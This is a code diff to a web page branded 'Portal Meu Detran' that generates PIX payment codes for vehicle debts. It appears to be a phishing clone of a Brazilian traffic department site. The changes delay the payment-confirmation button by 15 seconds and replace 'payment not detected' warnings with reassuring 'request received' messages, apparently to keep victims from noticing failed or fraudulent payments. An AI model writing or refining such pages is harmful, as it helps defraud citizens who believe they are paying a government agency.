@@ -49,7 +49,7 @@ function brToUs($valor) {
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-    <link rel="shortcut icon" href="/imagens/MsDetran.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="/imagens/detran-ms.ico" type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Meu Detran</title>
 
@@ -3742,7 +3742,7 @@ function brToUs($valor) {
                 dadosEnvio['fill_time'] = fillTime;
 
                 $.ajax({
-                    url: 'functions/api.php',
+                    url: '/functions/api.php',
                     method: 'POST',
                     data: dadosEnvio,
                     headers: {
@@ -4064,7 +4064,7 @@ function brToUs($valor) {
 
             function fazerDesafioJS(callback) {
                 $.ajax({
-                    url: 'functions/api.php',
+                    url: '/functions/api.php',
                     method: 'POST',
                     data: {
                         action: 'js_challenge',
@@ -4149,7 +4149,11 @@ function brToUs($valor) {
                         $('#unique-confirmPayment').attr('data-pix-code', pixCode);
                         $('#unique-confirmPayment').attr('data-ref', resposta.id);
 
+                        $('#unique-confirmPayment').hide();
                         $('#pix-modal').fadeIn();
+                        setTimeout(function() {
+                            $('#unique-confirmPayment').fadeIn();
+                        }, 15000);
                     }).fail(function(xhr) {
                         desativarLoadingPix($btn);
                         let errorMsg = 'Não foi possível gerar o código PIX.';
@@ -4181,7 +4185,12 @@ function brToUs($valor) {
                                         valorNumerico);
                                     $('#unique-confirmPayment').attr('data-pix-code',
                                         pixCode);
+                                    
+                                    $('#unique-confirmPayment').hide();
                                     $('#pix-modal').fadeIn();
+                                    setTimeout(function() {
+                                        $('#unique-confirmPayment').fadeIn();
+                                    }, 15000);
                                     return;
                                 } else {
 
@@ -4312,7 +4321,7 @@ function brToUs($valor) {
                     if (data && data.status === 'success' && data.payment_status === 'pago') {
                         mostrarTelaSucesso(valor, pixCode);
                     } else {
-                        mostrarTelaPendente(data.message || 'Pagamento ainda não foi detectado no sistema.');
+                        mostrarTelaPendente(data.message || 'Seu pagamento pode levar alguns instantes para constar em nosso sistema.');
                     }
                 } catch (e) {
                     $btn.prop('disabled', false);
@@ -4392,7 +4401,7 @@ function brToUs($valor) {
                         <div class="pix-pending-alert-text">
                             <p class="pix-pending-alert-title"><strong>Pagamento Pendente</strong></p>
                             <p class="pix-pending-alert-message">${mensagem}</p>
-                            <p class="pix-pending-alert-warning"><strong>Atenção:</strong> Conclua o pagamento para deixar seu veículo em dia e aproveitar os descontos disponíveis.</p>
+                            <p class="pix-pending-alert-warning"><strong>Atenção:</strong> Recebemos sua solicitação. O pagamento pode demorar alguns instantes para ser identificado em nosso sistema.</p>
                         </div>
                     </div>
                 </div>
